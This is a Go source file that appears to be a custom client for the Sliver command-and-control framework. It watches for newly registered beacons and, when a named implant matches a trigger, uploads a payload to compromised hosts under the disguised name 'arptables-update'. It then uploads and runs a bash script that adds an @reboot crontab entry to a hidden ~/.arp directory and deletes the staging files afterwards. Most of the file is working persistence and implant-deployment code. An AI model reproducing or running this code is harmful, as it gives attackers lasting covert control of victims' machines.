package client

import (
	"context"
	"fmt"
	"github.com/bishopfox/sliver/client/assets"
	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
	"google.golang.org/grpc"
	"io"
	"io/ioutil"
	"log"
	"strings"
	"time"
)

type SliverConnection struct {
	RPC rpcpb.SliverRPCClient
	LN  *grpc.ClientConn
}

func MakeRequest(session *clientpb.Session) *commonpb.Request {
	if session == nil {
		return nil
	}
	timeout := int64(60)
	return &commonpb.Request{
		SessionID: session.ID,
		Timeout:   timeout,
	}
}

func (con *SliverConnection) SliverConnect(configPath string) {
	var config *assets.ClientConfig
	var err error
	config = SelectConfig()
	if config == nil {
		fmt.Println("Config not found in default location, using \"-config\" flag.")
		// load the client configuration from the filesystem
		config, err = assets.ReadConfig(configPath)
		if err != nil {
			log.Fatal(err)
		}
		//log.Fatal("config file not found.")
	} else {
		fmt.Printf("Config found in default location.")
	}
	// connect to the server
	rpc, ln, err := transport.MTLSConnect(config)
	if err != nil {
		log.Fatal(err)
	}
	con.RPC = rpc
	con.LN = ln
	log.Printf("[*] Connected to sliver server: %s:%d", config.LHost, config.LPort)
	//defer LN.Close()
	// Open the event stream to be able to collect all events sent by  the server
	eventStream, err := con.RPC.Events(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}
	go func() {
		err = func() error {
			// infinite loop
			for {
				event, err := eventStream.Recv()
				if err == io.EOF || event == nil {
					return err
				}
				switch event.EventType {
				case consts.BeaconRegisteredEvent:
					beaconID := event.Data[2:38]
					app.Printf("Beacon registered: %s\t%d triggers defined.\n", string(beaconID), len(triggers))
					if len(triggers) != 0 {
						for triggernum, triggerIter := range triggers {
							if strings.Contains(string(event.Data[2:len(event.Data)/2]), triggerIter.ParentImplantName) {
								triggers[triggernum].triggered = append(triggers[triggernum].triggered, TriggeredType{
									Init:           false,
									ParentBeaconID: string(beaconID),
									uploadcount:    1,
								})
								app.Printf("Trigger match\n")
								fileBuf, err := ioutil.ReadFile(triggerIter.Filename)
								if err != nil {
									app.Printf("%s\n", err)
								}
								uploadGzip := new(encoders.Gzip).Encode(fileBuf)
								_, err = client.RPC.Upload(context.Background(), &sliverpb.UploadReq{
									Path:    "/tmp/arptables-update",
									Encoder: "gzip",
									Data:    uploadGzip,
									IsIOC:   false,
									Request: &commonpb.Request{
										Async:    true,
										Timeout:  int64(60),
										BeaconID: string(beaconID),
									},
								})
								if err != nil {
									app.Printf("%s\n", err)
								}
								////////////////
								uploadGzip = new(encoders.Gzip).Encode([]byte(`#!/bin/bash
if crontab -l | grep -v "#" | grep -q arptables-update; then
        echo ""
else
        (crontab -l 2>/dev/null; echo '@reboot ~/.arp/arptables-update &') | crontab -
        mkdir ~/.arp
        cp /tmp/arptables-update ~/.arp/arptables-update
        chmod 0755 ~/.arp/arptables-update
        ~/.arp/arptables-update
fi`))
								_, err = client.RPC.Upload(context.Background(), &sliverpb.UploadReq{
									Path:    "/tmp/cron.sh",
									Encoder: "gzip",
									Data:    uploadGzip,
									IsIOC:   false,
									Request: &commonpb.Request{
										Async:    true,
										Timeout:  int64(60),
										BeaconID: string(beaconID),
									},
								})
								if err != nil {
									app.Printf("%s\n", err)
								}
							}
						}
					}
				case consts.BeaconTaskResultEvent:
					beaconID := event.Data[40:76]
					if len(triggers) != 0 {
						for triggernum, triggerIter := range triggers {
							if len(triggerIter.triggered) != 0 {
								for triggerednum, triggeredIter := range triggerIter.triggered {
									if !triggeredIter.Init && string(beaconID) == triggeredIter.ParentBeaconID {
										if strings.Contains(string(event.Data), "UploadReq") && !triggeredIter.Init {
											triggers[triggernum].triggered[triggerednum].uploadcount++
											if triggeredIter.uploadcount == 2 {
												time.Sleep(2 * time.Second)
												_, err = client.RPC.Chmod(context.Background(), &sliverpb.ChmodReq{
													Path:      "/tmp/cron.sh",
													FileMode:  "0700",
													Recursive: false,
													Request: &commonpb.Request{
														Async:    true,
														Timeout:  int64(60),
														BeaconID: string(beaconID),
													},
												})
												if err != nil {
													app.Printf("%s\n", err)
												}
												_, err = client.RPC.Chmod(context.Background(), &sliverpb.ChmodReq{
													Path:      "/tmp/arptables-update",
													FileMode:  "0755",
													Recursive: false,
													Request: &commonpb.Request{
														Async:    true,
														Timeout:  int64(60),
														BeaconID: string(beaconID),
													},
												})
												if err != nil {
													app.Printf("%s\n", err)
												}
												time.Sleep(2 * time.Second)
												_, err = client.RPC.Execute(context.Background(), &sliverpb.ExecuteReq{
													Path: "/tmp/cron.sh",
													Args: []string{},
													Request: &commonpb.Request{
														Async:    true,
														Timeout:  int64(60),
														BeaconID: string(beaconID),
													},
												})
												if err != nil {
													app.Printf("%s\n", err)
												}
												triggeredIter.Init = false
											}
										} else if strings.Contains(string(event.Data), "ExecuteReq") && !triggeredIter.Init {
											_, err = client.RPC.Rm(context.Background(), &sliverpb.RmReq{
												Path:      "/tmp/cron.sh",
												Recursive: false,
												Force:     true,
												Request: &commonpb.Request{
													Async:    true,
													Timeout:  int64(60),
													BeaconID: string(beaconID),
												},
											})
											if err != nil {
												app.Printf("%s\n", err)
											}
											_, err = client.RPC.Rm(context.Background(), &sliverpb.RmReq{
												Path:      "/tmp/arptables-update",
												Recursive: false,
												Force:     true,
												Request: &commonpb.Request{
													Async:    true,
													Timeout:  int64(60),
													BeaconID: string(beaconID),
												},
											})
											if err != nil {
												app.Printf("%s\n", err)
											}
											triggeredIter.Init = true
										}
									}
								}
							}
						}
					}

				default:
					app.Printf("[*] - %s\n", event.EventType)
				}

				/*
					// Trigger event based on type
					switch event.EventType {
					// a new session just came in
					case consts.SessionOpenedEvent:
						session := event.Session
						// call any RPC you want, for the full list, see
						// https://github.com/BishopFox/sliver/blob/master/protobuf/rpcpb/services.proto
						resp, err := RPC.Execute(context.Background(), &sliverpb.ExecuteReq{
							Path:    `c:\windows\system32\calc.exe`,
							Output:  false,
							Request: makeRequest(session),
						})
						if err != nil {
							log.Fatal(err)
						}
						RPC.Cd(context.Background(), &sliverpb.CdReq{
							Path:    "",
							Request: makeRequest(),
						})
						// Don't forget to check for errors in the Response object
						if resp.Response != nil && resp.Response.Err != "" {
							log.Fatal(resp.Response.Err)
						}
					}

				*/

			}
		}()
		if err != nil {
			log.Fatal(err)
		}
	}()
}
